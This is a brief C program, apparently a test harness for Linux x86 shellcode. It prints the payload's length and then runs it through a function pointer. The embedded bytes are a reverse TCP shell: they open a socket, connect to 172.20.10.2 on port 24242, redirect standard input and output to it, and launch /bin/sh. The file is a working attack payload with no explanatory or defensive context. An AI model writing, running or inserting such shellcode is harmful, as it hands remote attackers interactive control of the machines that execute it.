#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x93\x31\xc0\x66\xb8\x6a\x01\x89\xe5\x52\x52\x68\xac\x14\x0a\x02\x66\x68\x5e\xb2\x66\x6a\x02\x89\xe1\x29\xe5\x89\xea\xcd\x80\x31\xc9\x31\xd2\xb1\x03\x31\xc0\xb0\x3f\x49\xcd\x80\x75\xf7\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\x31\xc0\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	